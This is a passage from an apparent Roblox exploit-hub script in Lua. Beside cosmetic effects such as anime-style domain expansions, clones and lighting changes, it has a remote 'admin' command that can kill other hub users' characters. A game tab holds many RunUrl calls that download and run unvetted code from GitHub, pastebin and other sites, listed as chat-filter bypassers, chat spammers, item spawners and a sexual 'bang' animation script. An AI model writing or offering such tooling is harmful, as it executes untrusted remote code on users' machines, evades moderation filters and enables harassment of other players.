			for _, p in ipairs(built) do
				tween(p, 1.2, { Position = p.Position - Vector3.new(0, 70, 0) })
				Debris:AddItem(p, 1.3)
			end
		end)
		endAmbienceAfter(token, 12)
		notify("Domain Expansion", "Malevolent Shrine", "Success")
	end

	-- 4) SHADOW CLONES (clones of YOUR character, they copy your movement/animations) ------------------
	local clones = {}
	local cloneConn

	local function poof(pos)
		local p = newPart({ Size = Vector3.new(1, 1, 1), Transparency = 1, Position = pos })
		local e = Instance.new("ParticleEmitter")
		e.Texture = "rbxasset://textures/particles/smoke_main.dds"
		e.Color = ColorSequence.new(Color3.fromRGB(200, 200, 200))
		e.Size = NumberSequence.new(4, 8)
		e.Transparency = NumberSequence.new(0.3, 1)
		e.Lifetime = NumberRange.new(0.6, 1)
		e.Speed = NumberRange.new(6, 12)
		e.SpreadAngle = Vector2.new(180, 180)
		e.Rate = 0
		e.Parent = p
		e:Emit(25)
		Debris:AddItem(p, 1.5)
	end

	local function clearClones()
		if cloneConn then
			cloneConn:Disconnect()
			cloneConn = nil
		end
		if #clones > 0 then playSound("snap", { Volume = 0.8, Pitch = 1.3 }) end
		for _, c in ipairs(clones) do
			if c.model.Parent then poof(c.model:GetPivot().Position) end
			c.model:Destroy()
		end
		table.clear(clones)
	end

	local cloneWanted = false
	local cloneAmount = 4

	local function relPath(inst, rootInst)
		local names = {}
		local cur = inst
		while cur and cur ~= rootInst do
			table.insert(names, 1, cur.Name)
			cur = cur.Parent
		end
		return table.concat(names, "/")
	end

	local function spawnClones(count)
		clearClones()
		local char = lp.Character
		local hrp = root()
		if not (char and hrp) then return notify("Shadow Clones", "Character not found", "Error") end

		-- Instance:Clone() skips anything that is not Archivable (many games turn it off),
		-- which gave broken/empty clones. Make everything archivable only while cloning.
		local changed = {}
		if not char.Archivable then
			char.Archivable = true
			table.insert(changed, char)
		end
		for _, d in ipairs(char:GetDescendants()) do
			if not d.Archivable then
				d.Archivable = true
				table.insert(changed, d)
			end
		end

		-- real parts grouped by their path inside the character
		local realByPath = {}
		for _, d in ipairs(char:GetDescendants()) do
			if d:IsA("BasePart") then
				local key = relPath(d, char)
				realByPath[key] = realByPath[key] or {}
				table.insert(realByPath[key], d)
			end
		end

		-- formation: spread behind/around the player
		local offsets = {}
		for i = 1, count do
			local side = (i % 2 == 0) and 1 or -1
			local row = math.ceil(i / 2)
			table.insert(offsets, Vector3.new(side * (3.5 + (row - 1) * 3), 0, row * 3.2))
		end

		local made = 0
		for i = 1, count do
			local ok, model = pcall(function() return char:Clone() end)
			if ok and model then
				model.Name = "ShadowClone_" .. i
				local cloneParts = {}
				for _, d in ipairs(model:GetDescendants()) do
					if d:IsA("LuaSourceContainer") then
						d:Destroy()
					elseif d:IsA("BasePart") then
						d.Anchored = true
						d.CanCollide = false
						d.CanQuery = false
						d.CanTouch = false
						table.insert(cloneParts, d)
					end
				end
				local hum = model:FindFirstChildOfClass("Humanoid")
				if hum then
					hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
				end

				local pairsList = {}
				local seen = {}
				for _, cp in ipairs(cloneParts) do
					local key = relPath(cp, model)
					seen[key] = (seen[key] or 0) + 1
					local rp = realByPath[key] and realByPath[key][seen[key]]
					if rp then
						table.insert(pairsList, { real = rp, clone = cp })
					end
				end

				if #pairsList > 0 then
					model.Parent = fxFolder
					table.insert(clones, { model = model, offset = offsets[i], pairs = pairsList })
					poof((hrp.CFrame * CFrame.new(offsets[i])).Position)
					made += 1
				else
					model:Destroy()
				end
			end
		end

		for _, d in ipairs(changed) do
			pcall(function() d.Archivable = false end)
		end

		if made == 0 then
			return notify("Shadow Clones", "Could not copy your character in this game", "Error")
		end

		cloneConn = RunService.Heartbeat:Connect(function()
			local h = root()
			if not h then return end
			for _, c in ipairs(clones) do
				local target = h.CFrame * CFrame.new(c.offset)
				for _, pr in ipairs(c.pairs) do
					if pr.real.Parent and pr.clone.Parent then
						pr.clone.CFrame = target * h.CFrame:ToObjectSpace(pr.real.CFrame)
					end
				end
			end
		end)
		playSound("snap", { Volume = 1, Pitch = 0.9 })
		playSound("whoosh", { Volume = 0.6, Pitch = 1.4 })
		notify("Shadow Clones", made .. " clones of you summoned", "Success")
	end

	-- 5) GIANT / TINY ---------------------------------------------------------------------------------
	local SCALE_NAMES = { "BodyHeightScale", "BodyWidthScale", "BodyDepthScale", "HeadScale" }
	local origScale

	local function setScale(mult)
		local char = lp.Character
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		if not hum then return notify("Size", "Character not found", "Error") end
		if hum.RigType ~= Enum.HumanoidRigType.R15 then
			return notify("Size", "Only works on R15 avatars (this one is R6)", "Warning")
		end
		if not origScale then
			origScale = {}
			for _, n in ipairs(SCALE_NAMES) do
				local v = hum:FindFirstChild(n)
				if not v then
					-- some games delete these values; create them so scaling still works
					v = Instance.new("NumberValue")
					v.Name = n
					v.Value = 1
					v.Parent = hum
				end
				origScale[n] = v.Value
			end
		end
		for n, base in pairs(origScale) do
			local v = hum:FindFirstChild(n)
			if v then v.Value = base * mult end
		end
	end

	lp.CharacterAdded:Connect(function()
		origScale = nil
		clearClones()
		if cloneWanted then
			task.delay(2, function()
				if cloneWanted and root() then spawnClones(cloneAmount) end
			end)
		end
	end)

	-- 6) HEAVEN ------------------------------------------------------------------------------------------
	local heavenObjs = {}
	local heavenSnd
	local heavenActive = false

	local function heavenOff()
		heavenActive = false
		if heavenSnd then
			local sd = heavenSnd
			heavenSnd = nil
			pcall(function()
				tween(sd, 1, { Volume = 0 })
				Debris:AddItem(sd, 1.1)
			end)
		end
		for _, o in ipairs(heavenObjs) do
			pcall(function() o:Destroy() end)
		end
		table.clear(heavenObjs)
		clearAmbience(1.5)
	end

	local function heavenOn()
		if heavenActive then return end
		heavenActive = true
		playSound("victory", { Volume = 0.9, Pitch = 0.85 })
		heavenSnd = playSound("ping", { Volume = 0.35, Pitch = 0.5, Loop = true })
		beginAmbience({
			Brightness = 4, ClockTime = 13, Ambient = Color3.fromRGB(255, 240, 200),
			OutdoorAmbient = Color3.fromRGB(255, 235, 190), FogColor = Color3.fromRGB(255, 245, 220),
			FogStart = 100, FogEnd = 1200, ExposureCompensation = 0.4,
		}, 1.5)
		addLightingObj("ColorCorrectionEffect", { Saturation = 0.15, Contrast = 0.05, TintColor = Color3.fromRGB(255, 240, 210) })
		addLightingObj("BloomEffect", { Intensity = 1.1, Size = 30, Threshold = 0.9 })
		addLightingObj("SunRaysEffect", { Intensity = 0.35, Spread = 0.9 })

		local hrp = root()
		if hrp then
			local halo = newPart({
				Shape = Enum.PartType.Cylinder, Size = Vector3.new(0.25, 3, 3),
				Color = Color3.fromRGB(255, 225, 120), Anchored = true,
			})
			table.insert(heavenObjs, halo)
			local sky = newPart({ Size = Vector3.new(80, 1, 80), Transparency = 1, Anchored = true })
			local e = Instance.new("ParticleEmitter")
			e.Texture = "rbxasset://textures/particles/sparkles_main.dds"
			e.Color = ColorSequence.new(Color3.fromRGB(255, 240, 170))
			e.Size = NumberSequence.new(0.6, 0.2)
			e.Lifetime = NumberRange.new(12, 16)
			e.Speed = NumberRange.new(2, 5)
			e.Rate = 40
			e.Acceleration = Vector3.new(0, -2, 0)
			e.LightEmission = 1
			e.EmissionDirection = Enum.NormalId.Bottom
			e.Shape = Enum.ParticleEmitterShape.Box
			e.ShapeStyle = Enum.ParticleEmitterShapeStyle.Volume
			e.Parent = sky
			table.insert(heavenObjs, sky)
			local conn
			conn = RunService.Heartbeat:Connect(function()
				local h = root()
				if not heavenActive or not h or not halo.Parent then
					conn:Disconnect()
					return
				end
				halo.CFrame = h.CFrame * CFrame.new(0, 3.4, 0) * CFrame.Angles(0, 0, math.rad(90))
				sky.CFrame = CFrame.new(h.Position + Vector3.new(0, 40, 0))
			end)
			table.insert(heavenObjs, { Destroy = function() conn:Disconnect() end })
		end
	end

	-- 7) BLACKOUT -------------------------------------------------------------------------------------------
	local blackoutLight
	local blackoutSnd
	local blackoutActive = false

	local function blackoutOn()
		if blackoutActive then return end
		blackoutActive = true
		playSound("button", { Volume = 1, Pitch = 0.5 })
		playSound("boom", { Volume = 0.5, Pitch = 0.4 })
		blackoutSnd = playSound("bass", { Volume = 0.45, Pitch = 0.35, Loop = true })
		beginAmbience({
			Brightness = 0, ClockTime = 0, Ambient = Color3.new(0, 0, 0), OutdoorAmbient = Color3.new(0, 0, 0),
			FogColor = Color3.new(0, 0, 0), FogStart = 0, FogEnd = 160, ExposureCompensation = -1,
		}, 0.4, true)
		addDarkSky(0)
		addLightingObj("ColorCorrectionEffect", { Brightness = -0.1, Contrast = 0.15 })
		local hrp = root()
		if hrp then
			blackoutLight = Instance.new("PointLight")
			blackoutLight.Range = 14
			blackoutLight.Brightness = 1.2
			blackoutLight.Color = Color3.fromRGB(255, 240, 220)
			blackoutLight.Parent = hrp
		end
	end

	local function blackoutOff()
		if not blackoutActive then return end
		blackoutActive = false
		playSound("button", { Volume = 1, Pitch = 1 })
		if blackoutSnd then
			local sd = blackoutSnd
			blackoutSnd = nil
			pcall(function()
				tween(sd, 0.8, { Volume = 0 })
				Debris:AddItem(sd, 0.9)
			end)
		end
		if blackoutLight then
			blackoutLight:Destroy()
			blackoutLight = nil
		end
		clearAmbience(1)
	end

	-- 8) KAMUI (spiral dimension: vortex + you turn intangible for a few seconds) ----------------------------
	local function kamui()
		local hrp = root()
		local char = lp.Character
		if not (hrp and char) then return notify("Kamui", "Character not found", "Error") end
		local base = hrp.CFrame * CFrame.new(0, 0, -4)
		local rings = {}
		for i = 1, 14 do
			local r = newPart({
				Shape = Enum.PartType.Cylinder, Size = Vector3.new(0.3, 22 - i * 1.4, 22 - i * 1.4),
				Color = (i % 2 == 0) and Color3.fromRGB(20, 20, 20) or Color3.fromRGB(140, 60, 220),
				Transparency = 0.15,
				CFrame = base * CFrame.new(0, 0, -i * 0.5) * CFrame.Angles(0, math.rad(90), 0),
			})
			table.insert(rings, r)
		end

		playSound("whoosh", { Volume = 1, Pitch = 0.7 })
		playSound("bass", { Volume = 0.7, Pitch = 0.7, Loop = true, Time = 5 })
		local saved = {}
		for _, d in ipairs(char:GetDescendants()) do
			if d:IsA("BasePart") then
				saved[d] = { d.CanCollide, d.LocalTransparencyModifier }
				d.CanCollide = false
				d.LocalTransparencyModifier = 0.75
			end
		end

		runFx(5, function(t)
			for i, r in ipairs(rings) do
				r.CFrame = base * CFrame.new(0, 0, -i * 0.5) * CFrame.Angles(0, math.rad(90), 0)
					* CFrame.Angles(t * (3 + i * 0.4) * ((i % 2 == 0) and 1 or -1), 0, 0)
			end
		end, function()
			playSound("snap", { Volume = 1, Pitch = 0.8 })
			for _, r in ipairs(rings) do
				fadeOut(r, 0.5)
			end
			for part, v in pairs(saved) do
				if part.Parent then
					part.CanCollide = v[1]
					part.LocalTransparencyModifier = v[2]
				end
			end
		end)
		notify("Kamui", "Intangible for 5 seconds", "Success")
	end

	-- UI --------------------------------------------------------------------------------------------------------------
	FX:CreateLabel({ Text = "Visual effects — only you can see them" })
	FX:CreateToggle({
		Name = "Effect Sounds",
		Description = "Play sounds with every effect",
		Flag = "fxSoundOn",
		Default = true,
		Callback = function(state) soundOn = state end,
	})
	FX:CreateSlider({
		Name = "Sound Volume",
		Min = 0, Max = 2, Step = 0.1, Decimals = 1, Default = 1, Suffix = "x", Flag = "fxSoundVol",
		Callback = function(v) soundVolume = v end,
	})

	FX:CreateSection({ Text = "Gojo" })
	FX:CreateButton({ Name = "Domain Expansion: Infinite Void", Description = "Black void with stars around you", ButtonText = "Cast", Callback = gojoDomain })
	FX:CreateButton({ Name = "Hollow Purple", Description = "Blue + Red merge into Purple and fire forward", ButtonText = "Fire", Callback = hollowPurple })

	FX:CreateSection({ Text = "Sukuna" })
	FX:CreateButton({ Name = "Domain Expansion: Malevolent Shrine", Description = "Shrine rises with endless slashes", ButtonText = "Cast", Callback = malevolentShrine })

	FX:CreateSection({ Text = "Shadow Clones (your own character)" })
	FX:CreateSlider({
		Name = "Clone Amount", Min = 1, Max = 8, Step = 1, Default = 4, Flag = "fxCloneCount",
		Callback = function(v)
			cloneAmount = math.floor(tonumber(v) or 4)
			if cloneWanted then spawnClones(cloneAmount) end
		end,
	})
	FX:CreateToggle({
		Name = "Shadow Clones",
		Description = "Clones of YOU that copy your movement",
		Default = false,
		Callback = function(state)
			cloneWanted = state
			if state then
				spawnClones(cloneAmount)
			else
				clearClones()
			end
		end,
	})

	FX:CreateSection({ Text = "Size" })
	FX:CreateDropdown({
		Name = "Body Size",
		Options = { "Normal", "Giant", "Tiny" },
		Default = "Normal",
		Callback = function(value)
			if value == "Giant" then
				playSound("boom", { Volume = 1, Pitch = 0.5 })
				playSound("bass", { Volume = 0.8, Pitch = 0.4, Time = 2 })
				setScale(4)
			elseif value == "Tiny" then
				playSound("ping", { Volume = 0.9, Pitch = 2 })
				playSound("whoosh", { Volume = 0.6, Pitch = 2 })
				setScale(0.4)
			else
				playSound("snap", { Volume = 0.8 })
				setScale(1)
			end
		end,
	})

	FX:CreateSection({ Text = "World" })
	FX:CreateToggle({ Name = "Heaven", Description = "Golden sky, halo and falling light", Default = false, Callback = function(s) if s then heavenOn() else heavenOff() end end })
	FX:CreateToggle({ Name = "Blackout", Description = "Everything goes dark", Default = false, Callback = function(s) if s then blackoutOn() else blackoutOff() end end })

	FX:CreateSection({ Text = "Naruto" })
	FX:CreateButton({ Name = "Kamui", Description = "Spiral vortex, you turn intangible for 5s", ButtonText = "Use", Callback = kamui })

	-- ==============================================================================================
	-- REMOTE (ADMIN) EFFECTS: run on THIS client when a staff member fires them from the Admin panel.
	-- Library.RunRemoteFx(kind, data) is called by the "xfx" command in ADMIN COMMANDS.
	-- ==============================================================================================
	local adminClones = {}
	local adminCloneConn
	local fxTokens = {}

	local function later(group, sec, fn)
		fxTokens[group] = (fxTokens[group] or 0) + 1
		local mine = fxTokens[group]
		task.delay(sec, function()
			if fxTokens[group] == mine then
				pcall(fn)
			end
		end)
	end

	local function clearAdminClones()
		if adminCloneConn then
			adminCloneConn:Disconnect()
			adminCloneConn = nil
		end
		for _, m in ipairs(adminClones) do
			if m.Parent then
				poof(m:GetPivot().Position)
			end
			m:Destroy()
		end
		table.clear(adminClones)
	end

	-- Clones of the ADMIN (the sender) that stand in a circle around the target
	local function senderClones(uid, count, sec)
		clearAdminClones()
		uid = tonumber(uid)
		if not uid then return end
		count = math.clamp(math.floor(tonumber(count) or 6), 1, 8)
		local okM, base = pcall(function()
			return Players:CreateHumanoidModelFromUserId(uid)
		end)
		if not (okM and base) then return end
		if not root() then
			base:Destroy()
			return
		end

		for i = 1, count do
			local model = base:Clone()
			model.Name = "AdminClone_" .. i
			for _, d in ipairs(model:GetDescendants()) do
				if d:IsA("LuaSourceContainer") then
					d:Destroy()
				elseif d:IsA("BasePart") then
					d.Anchored = true
					d.CanCollide = false
					d.CanQuery = false
					d.CanTouch = false
				end
			end
			local hum = model:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
			end
			model.Parent = fxFolder
			table.insert(adminClones, model)
		end
		base:Destroy()

		playSound("snap", { Volume = 1, Pitch = 0.9 })
		playSound("whoosh", { Volume = 0.6, Pitch = 1.4 })

		local t0 = os.clock()
		adminCloneConn = RunService.Heartbeat:Connect(function()
			local h = root()
			if not h then return end
			local spin = (os.clock() - t0) * 0.5
			for i, m in ipairs(adminClones) do
				local a = spin + (i / #adminClones) * math.pi * 2
				local pos = h.Position + Vector3.new(math.cos(a) * 9, 0, math.sin(a) * 9)
				m:PivotTo(CFrame.lookAt(pos, Vector3.new(h.Position.X, pos.Y, h.Position.Z)))
			end
		end)
		for _, m in ipairs(adminClones) do
			poof(m:GetPivot().Position)
		end
		later("clones", sec, clearAdminClones)
	end

	local function lightningBolt(topPos, hitPos, width)
		local segs = 10
		local prev = topPos
		for i = 1, segs do
			local p
			if i == segs then
				p = hitPos
			else
				p = topPos:Lerp(hitPos, i / segs) + Vector3.new(math.random(-7, 7), 0, math.random(-7, 7))
			end
			local len = (p - prev).Magnitude
			if len > 0.05 then
				local seg = newPart({
					Size = Vector3.new(width, width, len),
					CFrame = CFrame.lookAt((prev + p) / 2, p),
					Color = Color3.fromRGB(190, 220, 255),
				})
				fadeOut(seg, 0.55)
			end
			prev = p
		end
	end

	-- Thunder strike: sky goes dark, lightning hits you, you die (if `kill`)
	local function thunderStrike(kill, sec)
		local hrp = root()
		if not hrp then return end
		-- everything goes dark
		blackoutOn()
		later("blackout", sec, blackoutOff)
		playSound("bass", { Volume = 0.8, Pitch = 0.3, Time = 2 })

		task.delay(1.3, function()
			local h = root()
			if not h then return end
			local flash = Instance.new("ColorCorrectionEffect")
			flash.Brightness = 1
			flash.Parent = Lighting
			tween(flash, 0.7, { Brightness = 0 })
			Debris:AddItem(flash, 0.9)

			local hit = h.Position - Vector3.new(0, 2.5, 0)
			for i = 1, 3 do
				task.delay((i - 1) * 0.12, function()
					lightningBolt(hit + Vector3.new(math.random(-6, 6), 160, math.random(-6, 6)), hit, i == 1 and 1.4 or 0.6)
				end)
			end
			playSound("boom", { Volume = 1, Pitch = 0.8 })
			playSound("boom", { Volume = 0.8, Pitch = 1.3 })

			local scorch = newPart({
				Shape = Enum.PartType.Cylinder,
				Size = Vector3.new(0.2, 9, 9),
				CFrame = CFrame.new(hit) * CFrame.Angles(0, 0, math.rad(90)),
				Color = Color3.fromRGB(255, 255, 255),
				Transparency = 0.2,
			})
			fadeOut(scorch, 1.2)

			if kill then
				task.delay(0.15, function()
					local hum = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
					if hum then
						hum.Health = 0
					end
				end)
			end
		end)
	end

	local REMOTE_KINDS = {
		gojo = true, purple = true, shrine = true, clones = true,
		giant = true, tiny = true, heaven = true, blackout = true,
		thunder = true, stop = true,
	}
	-- these are allowed to be sent to everyone (same server, hub users only)
	local REMOTE_ALL_KINDS = { thunder = true, blackout = true, heaven = true, stop = true }
	Library.RemoteFxKinds = REMOTE_KINDS
	Library.RemoteFxAllKinds = REMOTE_ALL_KINDS

	Library.RunRemoteFx = function(kind, d)
		if not REMOTE_KINDS[kind] then return end
		d = d or {}
		local sec = math.clamp(math.floor(tonumber(d.sec) or 15), 5, 60)
		if kind == "gojo" then
			gojoDomain()
		elseif kind == "purple" then
			hollowPurple()
		elseif kind == "shrine" then
			malevolentShrine()
		elseif kind == "clones" then
			senderClones(d.uid, d.count, sec)
		elseif kind == "giant" then
			setScale(3)
			later("size", sec, function() setScale(1) end)
		elseif kind == "tiny" then
			setScale(0.4)
			later("size", sec, function() setScale(1) end)
		elseif kind == "heaven" then
			heavenOn()
			later("heaven", sec, heavenOff)
		elseif kind == "blackout" then
			blackoutOn()
			later("blackout", sec, blackoutOff)
		elseif kind == "thunder" then
			thunderStrike(true, sec)
		elseif kind == "stop" then
			for k in pairs(fxTokens) do
				fxTokens[k] += 1
			end
			clearAdminClones()
			pcall(setScale, 1)
			pcall(heavenOff)
			pcall(blackoutOff)
			clearAmbience(1)
		end
	end
	-- Local Thunder Strike button (no kill) --------------------------------------------------------
	FX:CreateSection({ Text = "Weather" })
	FX:CreateButton({
		Name = "Thunder Strike",
		Description = "Sky goes dark, lightning hits where you stand",
		ButtonText = "Strike",
		Callback = function() thunderStrike(false, 6) end,
	})

	Loader:AddCleanup(clearAdminClones)
end

-- Tabs by game ID (only appear in the compatible game; name fetched automatically) ---------------
local GameOne = Loader:CreateTab(4924922222, { Search = true })

GameOne:CreateScript({
	Name = "VÆLOR MUSIC",
	Description = "Play music by ID with a built-in playlist, made for Brookhaven",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-MUSIC-PANEL-1K-IDS-/main/V%C3%86LOR%20MUSIC%20PANEL%201K%20IDS")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR MUSIC | NO GAMEPASS",
	Description = "Music player that works even without the Brookhaven gamepass",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-MUSIC-LOL/main/V%C3%86LOR%20MUSIC%20HUB%20BY%20N0T_Z0RO100")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR RECHAT",
	Description = "best simple ui, Can swear without tags",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-RECHAT-UPDATED/main/V%C3%86LOR%20RECHAT")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR Prop Hub",
	Description = "Spawn and control props with a simple hub interface",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-PROP-PANEL/main/V%C3%86LOR%20PROP%20PANEL")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR Particle Giver",
	Description = "Give yourself particle effects with one click",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-FE-PARTICLE-/main/V%C3%86LOR%20PARTICLE%20GIVER")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR All Seeing Hand",
	Description = "Special hand effect with extra visual tricks for your character",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-ALL-SEENING-HAND/main/V%C3%86LOR%20ALL%20SEEING%20HAND")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR Catalog",
	Description = "Browse the catalog and try items directly in game",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-FINAL-CATALOG/main/V%C3%86LOR%20CATALOG%20BY%20N0T_Z0RO100")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR Chat Bypasser",
	Description = "Send messages with tweaked text that avoids chat filtering",
	Callback = function()
		RunUrl("https://haxhell.com/raw/universal-script-must-v4-chat-bypasser")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR Spammer",
	Description = "Quickly repeat a message in chat with adjustable delay",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/V-LOR-SPAMMER/main/V%C3%86LOR%20SPAMMER")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR DRAGON",
	Description = "Prop dragon | Creation vid avaliable on our discord server",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-DRAGONN/main/V%C3%86LOR%20DRAGON")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR SpammerV3",
	Description = "Upgraded spammer with faster speed and more options",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/V-LOR-SPAMMER-V3/main/V%C3%86LOR%20SPAMMER%20V3")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR BANG",
	Description = "Face bang, Back bang and more",
	Callback = function()
		RunUrl("https://scriptblox.com/raw/Brookhaven-RP-TXR-BANG-233812")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR ITEM SPAWNER",
	Description = "Gives VIP items",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-ITEM-SPAWNER/main/V%C3%86LOR%20ITEM%20SPAWNER")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR FONTS CHAT",
	Description = "Gives diffrent diffrent fonts style",
	Callback = function()
		RunUrl("https://pastebin.com/raw/KPyzxMeM")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR MINECRAFT FONT CHANGER",
	Description = "Changes most of the texts in minecarft style",
	Callback = function()
		RunUrl("https://pastebin.com/Gyjnif5B")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR V0 SPAMMER",
	Description = "Fast Premium Spammer With 0 Tag Rate",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAEL0R-SPAMMER/main/V%C3%86LOR%20V0%20SPAMMER")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR AUTO WB PANEL",
	Description = "Automatically Sends WB To The People Who Are In Your Connections",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-AUTO-WB-PANEL/main/V%C3%86LOR%20AUTO%20WB%20PANEL")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR RP FONTS",
	Description = "This Script Let You Customize Rp Name",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/VAELOR-RP-FONTS/main/V%C3%86LOR%20FONTS")
	end,
})

GameOne:CreateScript({
	Name = "VÆLOR FLY GUI",
	Description = "Let User Fly, Compact Ui",
	Callback = function()
		RunUrl("https://raw.githubusercontent.com/lol-nashedi/Fly-Gui/main/FLY%20GUI")
	end,
})

--==================================================================================================
-- PROTECTION TAB
-- PASTE THIS right after the last GameOne:CreateScript (VÆLOR ITEM SPAWNER) and BEFORE
-- the "SHARED HELPERS" section. Tabs are ordered by creation, so it shows up right after Brookhaven.
--==================================================================================================
do
	local PlayersSvc = game:GetService("Players")
	local RunSvc = game:GetService("RunService")
	local WorkspaceSvc = game:GetService("Workspace")

	local Protection = Loader:CreateTab("Protection")
	local allToggles = {}

	-- Per-feature storage of connections / cleanup functions ----------------------------------
	local features = {}

	local function bag(name)
		features[name] = features[name] or {}
		return features[name]
	end

	local function clearFeature(name)
		local list = features[name]
		features[name] = {}
		if not list then
			return
		end
		for _, item in ipairs(list) do
			pcall(function()
				if typeof(item) == "RBXScriptConnection" then
					item:Disconnect()
				elseif type(item) == "function" then
					item()
				end
			end)
		end
	end

	Loader:AddCleanup(function()
		for name in pairs(features) do
			clearFeature(name)
		end
	end)

	local function getChar()
		return LocalPlayer.Character
	end

	local function getRoot()
		local char = getChar()
		return char and char:FindFirstChild("HumanoidRootPart")
	end

	local function getHum()
		local char = getChar()
		return char and char:FindFirstChildOfClass("Humanoid")
	end

	-- Runs fn(character) for the current character and every future respawn
	local function onEveryCharacter(list, fn)
		table.insert(list, LocalPlayer.CharacterAdded:Connect(function(char)
			task.spawn(fn, char)
		end))
		if LocalPlayer.Character then
			task.spawn(fn, LocalPlayer.Character)
		end
	end

	local function addToggle(config)
		local toggle = Protection:CreateToggle(config)
		if toggle then
			table.insert(allToggles, toggle)
		end
		return toggle
	end

	--==============================================================================================
	-- 1) ANTI FLING: velocity reset + others become non-collidable
	--==============================================================================================
	local function setAntiFling(state)
		clearFeature("antiFling")
		if not state then
			return
		end
		local list = bag("antiFling")
		local lastCalm

		-- Other players' bodies stop colliding with you (the usual fling method needs collision)
		table.insert(list, RunSvc.Stepped:Connect(function()
			for _, plr in ipairs(PlayersSvc:GetPlayers()) do
				if plr ~= LocalPlayer and plr.Character then
					for _, part in ipairs(plr.Character:GetChildren()) do
						if part:IsA("BasePart") and part.CanCollide then
							part.CanCollide = false
						end
					end
				end
			end
		end))

		-- If you suddenly get a huge velocity, cancel it and return to the last calm position
		table.insert(list, RunSvc.Heartbeat:Connect(function()
			local root, hum = getRoot(), getHum()
			if not root or not hum or hum.SeatPart then
				return
			end
			local v = root.AssemblyLinearVelocity
			local horizontal = Vector3.new(v.X, 0, v.Z).Magnitude
			local limit = math.max(hum.WalkSpeed * 4, 150)
			local flung = horizontal > limit or v.Y > 180 or root.AssemblyAngularVelocity.Magnitude > 60

			if flung then
				root.AssemblyLinearVelocity = Vector3.zero
				root.AssemblyAngularVelocity = Vector3.zero
				if lastCalm then
					root.CFrame = lastCalm
				end
			else
				lastCalm = root.CFrame
			end
		end))
	end

	--==============================================================================================
	-- 2) ANTI SIT / GRAB / COUCH
	--==============================================================================================
	local function setAntiSit(state)
		clearFeature("antiSit")
		if not state then
			local hum = getHum()
			if hum then
				pcall(function()
					hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
				end)
			end
			return
		end
		local list = bag("antiSit")

		onEveryCharacter(list, function(char)
			local hum = char:WaitForChild("Humanoid", 5)
			if not hum then
				return
			end
			hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
			hum.Sit = false
			table.insert(list, hum:GetPropertyChangedSignal("Sit"):Connect(function()
				if hum.Sit then
					hum.Sit = false
					hum:ChangeState(Enum.HumanoidStateType.GettingUp)
				end
			end))
		end)
	end

	--==============================================================================================
	-- 3) ANTI VOID: teleports you back to the last safe ground position
	--==============================================================================================
	local function setAntiVoid(state)
		clearFeature("antiVoid")
		if not state then
			return
		end
		local list = bag("antiVoid")
		local voidY = math.max(WorkspaceSvc.FallenPartsDestroyHeight + 100, -150)
		local safeCF

		table.insert(list, RunSvc.Heartbeat:Connect(function()
			local root, hum = getRoot(), getHum()
			if not root or not hum then
				return
			end
			local y = root.Position.Y
			if hum.FloorMaterial ~= Enum.Material.Air and y > voidY + 50 then
				safeCF = root.CFrame
			elseif y < voidY and safeCF then
				root.AssemblyLinearVelocity = Vector3.zero
				root.AssemblyAngularVelocity = Vector3.zero
				root.CFrame = safeCF + Vector3.new(0, 5, 0)
			end
		end))
	end

	--==============================================================================================
	-- 5) ANTI VEHICLE FLING (Brookhaven: Workspace.Vehicles)
	--    Other people's vehicles stop colliding with you. Your own vehicle is left untouched.
	--==============================================================================================
	local function setAntiVehicle(state)
		clearFeature("antiVehicle")
		if not state then
			return
		end
		local list = bag("antiVehicle")
		local running = true
		local touched = {}

		table.insert(list, function()
			running = false
		end)
		table.insert(list, function()
			for part in pairs(touched) do
				if part.Parent then
					part.CanCollide = true
				end
			end
			table.clear(touched)
		end)

		task.spawn(function()
			while running do
				local vehicles = WorkspaceSvc:FindFirstChild("Vehicles")
				local hum = getHum()
				local seat = hum and hum.SeatPart
				if vehicles then
					for _, model in ipairs(vehicles:GetChildren()) do
						if seat and seat:IsDescendantOf(model) then
							-- you are driving this one: give its collision back
							for part in pairs(touched) do
								if part:IsDescendantOf(model) then
									part.CanCollide = true
									touched[part] = nil
								end
							end
						else
							for _, part in ipairs(model:GetDescendants()) do
								if part:IsA("BasePart") and part.CanCollide then
									touched[part] = true
									part.CanCollide = false
								end
							end
						end
					end
